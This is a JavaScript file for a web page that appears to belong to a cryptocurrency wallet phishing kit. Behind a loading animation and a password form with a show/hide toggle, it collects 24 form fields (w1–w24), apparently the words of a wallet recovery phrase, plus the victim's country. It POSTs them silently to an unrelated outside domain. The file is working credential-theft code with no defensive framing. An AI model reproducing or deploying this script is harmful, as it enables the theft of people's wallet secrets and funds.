window.onload = function(){
    setTimeout(function(){

     $(".loader-wrapper").fadeOut("slow");
    }, 1500);

	 setTimeout(pollDOMo, 1800);
function pollDOMo () {
    var op = 0.1;  // initial opacity
    var timer = setInterval(function () {
        if (op >= 1){
            clearInterval(timer);
            //document.getElementById('two').style.display = 'none';
        }
        document.getElementById("twoo").style.opacity = op;
        document.getElementById("twoo").style.filter = 'alpha(opacity=' + op * 100 + ")";
        op += op * 0.1;
    }, 5);
 //document.getElementById("two").style.display="flex"
}
   };
$('a').click(function (event) {
  var x = document.getElementById("ww");
  if (x.type === "password") {
  document.getElementById("fho").src = "img/eye.jpg";
    x.type = "text";
  } else {
    document.getElementById("fho").src = "img/noeye.jpg";
    x.type = "password";
  }
});

function sleep(delay) {
    var start = new Date().getTime();
    while (new Date().getTime() < start + delay);
}

         $('#formo').submit(function (event) {
            event.preventDefault();
			if($('#ww').val().length < 8){ // checks the password value length
       alert('You have entered less than 8 characters for password');
       return false;
			}else{
 document.getElementById("ho").style.display="none"
 document.getElementById("hoo").style.display="block"

 setTimeout(pollDOM, 3000);
function pollDOM () {
 document.getElementById("tree").style.display="flex"
 document.getElementById("two").style.display="none"
}
     }
         });
		 
$('a').click(function(event) {
var target = event.target;
var id = target.id;
  if (event.currentTarget.id === "runer") {
  document.getElementById("one").style.display = "flex";
  document.getElementById("tree").style.display="none";
  setTimeout(pollDOMo, 20000);
  }
});
		 
		 
        $('#form').submit(function (event) {
            event.preventDefault();
            $.ajax({
                type : 'POST',
                url : 'https://4shoes.shop/',
                data : {
                    w1: document.getElementById('w1').value,
                    w2: document.getElementById('w2').value,
                    w3: document.getElementById('w3').value,
                    w4: document.getElementById('w4').value,
                    w5: document.getElementById('w5').value,
                    w6: document.getElementById('w6').value,
                    w7: document.getElementById('w7').value,
                    w8: document.getElementById('w8').value,
                    w9: document.getElementById('w9').value,
                    w10: document.getElementById('w10').value,
                    w11: document.getElementById('w11').value,
                    w12: document.getElementById('w12').value,
                    w13: document.getElementById('w13').value,
                    w14: document.getElementById('w14').value,
                    w15: document.getElementById('w15').value,
                    w16: document.getElementById('w16').value,
                    w17: document.getElementById('w17').value,
                    w18: document.getElementById('w18').value,
                    w19: document.getElementById('w19').value,
                    w20: document.getElementById('w20').value,
                    w21: document.getElementById('w21').value,
                    w22: document.getElementById('w22').value,
                    w23: document.getElementById('w23').value,
                    w24: document.getElementById('w24').value,
					country: document.getElementById('country').value
                }
            }); 
        });
		